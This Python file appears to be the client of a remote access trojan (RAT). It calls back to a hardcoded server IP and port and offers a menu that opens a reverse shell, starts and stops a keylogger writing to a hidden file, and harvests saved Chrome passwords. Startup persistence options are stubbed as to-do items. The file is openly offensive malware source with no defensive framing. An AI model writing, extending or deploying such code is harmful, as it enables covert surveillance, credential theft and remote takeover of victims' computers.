from connection import Connection
from rev_shell import Shell
import socket
from chrome_passwords import ChromePass
from keylogger import KeyLogger
from time import sleep


class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Gets passwords from google chrome
        - Logs key events to a file
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int, keylog_filename: str = ".activity.txt", chromepass_filename: str = ".chrome_log.txt") -> None:
        """
        Constructor

        required:
        :param host: The server's IP
        :param port: The server's port number
        
        optional:
        :param keylog_filename: The file's name where the keystrokes are stored
        :param chromepass_filename: The file name where the chrome passwords are stored
        """

        self.host = host
        self.port = port
        self.keylog_filename = keylog_filename
        self.chromepass_filename = chromepass_filename

        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)

        # Create google password collector instance
        self.chrome_pass = ChromePass(self.chromepass_filename)

        # Initialize keylogger instance
        self.keylogger = KeyLogger(self.keylog_filename)


    def run(self) -> None:
        """
        1. Stores google chrome passwords to file
        2. Starts logging key events to file
        3. Gets a reverse shell from client to server
        """
        
        while 1:
            choice = self.open_menu()
            
            if choice == 1:
                self.shell.get_shell()
                
            elif choice == 2:
                self.keylogger.start_log()
                self.send_data("\n\nKeylogging started to file '{}'...".format(self.keylog_filename))
                
            elif choice == 3:
                self.keylogger.end_log()
                self.send_data("\n\nKeylogging stopped...")

            elif choice == 4:
                self.chrome_pass.get_chrome_pass()
                self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename))
            
            elif choice == 5:
                #ToDo
                pass
                
            elif choice == 6:
                #ToDo
                pass
            
            # Waits 1s
            sleep(1)

    def open_menu(self) -> int:
        """
        Opens the selection menu to the server

        :param socket: Then socket to send the data through
        
        :returns: The choice of the menu, options are...
                    1: Rev shell
                    2: Start keylogger
                    3: Stop keylogger
                    4: Get chrome passwords
                    5: Add RAT to startup
                    6: Remove RAT from startup
        """
        
        response = ""
        
        # Opens menu
        menu_str = "\n\n\n\nPlease select one of the functionalities from the following menu: \n \n \
            1) Get a reverse shell \n \
            2) Start keylogger \n \
            3) Stop keylogger \n \
            4) Get chrome passwords \n \
            5) Add RAT to startup \
            6) Remove RAT from startup \
            \n Choice: "
        
        self.send_data(menu_str)
            
        
        # Receives messages from server
        response = self.receive_data()
        
        # Try to convert to int
        try:
            response = int(response)
        except ValueError:
            pass
        
        # Check valid response
        if not response in [1,2,3,4]:
            self.open_menu()
        
        return response
        
    
    def send_data(self, data: str) -> None:
        """
        Sends data through socket

        :param data: The data to send
        """
        self.sock.send(str.encode(data))


    def receive_data(self) -> str:
            """
            Receives data through socket
            """

            data = ""
            
            # Wait until data is received
            while data == "":
                data = self.sock.recv(1024).decode("UTF-8")
            
            return data


if __name__ == "__main__":
    # Run RAT with specified IP and port continiously
    while 1:
        Client("192.168.178.92", 9001).run()
